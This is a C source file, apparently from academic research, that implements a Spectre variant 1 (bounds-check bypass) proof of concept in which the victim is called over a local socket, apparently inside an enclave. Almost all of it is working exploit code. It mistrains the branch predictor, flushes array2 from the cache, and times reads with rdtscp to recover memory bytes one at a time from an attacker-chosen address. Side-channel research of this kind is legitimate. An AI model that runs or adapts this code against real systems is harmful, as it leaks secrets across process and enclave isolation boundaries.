/*
 * Copyright 2018 Imperial College London
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at   
 * 
 *      http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/mman.h>

#include "MIC.h"

#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif


unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1dupe[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64];
uint8_t array2[256 * 512];

static int count=0;
static void print_ecall(ecall_val* eval)
{
	printf("THIS IS CURRENT ECALL PACKET:\n type: %d\n x : %d\n array2: %d\n array1_size: %d\n malicious_x: %d\n",eval->type, eval->x, eval->array2, eval->array1_size, eval->malicious_x);
}
	
int socket_ecall(ecall_val* eval)
{
	int client_socket;
	int port_numb;
	int ret;

	struct sockaddr_in addr;
	port_numb= 1732;
	client_socket= socket(AF_INET,SOCK_STREAM,0);
	if(client_socket ==-1){
		printf("error: socket not created\n");
		return -1;
	}

	memset(&addr, 0, sizeof(addr));
	addr.sin_family=AF_INET;
	addr.sin_port = htons(port_numb);
	//printf("connecting.....\n");


	ret= connect(client_socket, (struct sockaddr*)&addr, sizeof(addr));
	if(ret==-1){
		printf("error: connection error\n");
		close(client_socket);
		return -1;
	}

	//print_ecall(eval);
	write(client_socket, eval, sizeof(ecall_val));
	ret=read(client_socket, eval, sizeof(ecall_val));
	//print_ecall(eval);
	if(ret==-1){
		printf("error: read error\n");
		close(client_socket);
		return -1;
	}
	else
	//	printf("Ecall success\n");
	close(client_socket);
	return 0;
}




/********************************************************************
 Analysis code
********************************************************************/
 #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, mix_i, check; 
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;

	ecall_val eval;
	
	for (i = 0; i < 256; i++)
		results[i] = 0;

	for (tries = 999; tries > 0; tries--) {
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
		_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--) {
			_mm_clflush(&array1_size);
			volatile int z;
			for (z = 0; z < 100; z++) {} /* Delay (can also mfence) */
			
			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));
			
			/* Call the victim! */ 
			eval.type=2;//victim call set
			eval.x = x;
			eval.array2 = array2;
			eval.array1_size = &array1_size;
			eval.malicious_x = NULL;
			check=socket_ecall(&eval);
			count++;
			//print_ecall(&eval);
			if(check<0)
				return;
		}
		
		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++) {
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];
			time1 = __rdtscp(&junk); /* READ TIMER */
			junk = *addr; /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
			//if (time2 <= CACHE_HIT_THRESHOLD)
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1dupe[tries % array1_size])
			{
				results[mix_i]++; /* cache hit - add +1 to score for this value */
			}
		}
		
		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
			} else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}

		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
		}

	results[0] ^= junk; /* use junk so code above won’t get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
 }


int spectre_main(int argc, char **argv) {
	size_t malicious_x; 
	struct ecall_val eval;
	int ret;

	eval.type = 1;
	eval.x = NULL;
	eval.array2 = NULL;
	eval.array1_size = NULL;
	eval.malicious_x=NULL;

	ret=socket_ecall(&eval);
	count++;
	if(ret<0)
		return -1;

	//print_ecall(&eval);

	malicious_x = eval.malicious_x;
/*	if(!malicious_x){
		print_ecall(&eval);
		return -1;
	}
*/	
	int i, score[2], len=40;
	uint8_t value[2];
	
	for (i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */

	if (argc == 3) {
		sscanf(argv[1], "%p", (void**)(&malicious_x));
		malicious_x -= (size_t)array1dupe; /* Convert input value into a pointer */
		sscanf(argv[2], "%d", &len);
	}
	
	printf("Reading %d bytes:\n", len);
	
	while (--len >= 0) {
		printf("Reading at malicious_x = %p... ", (void*)malicious_x);
		readMemoryByte(malicious_x++, value, score);
		printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
		printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0)
			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
		printf("\n");
	}

	return (0);
 }

/* Application entry */
int main(int argc, char *argv[])
{

    int ret;
    /* Call the main attack function*/
    ret=spectre_main(argc, argv); 
    if(ret<0){
	    printf("error close THE END\n");
	    return -1;
    }
printf("count : %d\n",count);
    return 0;
}

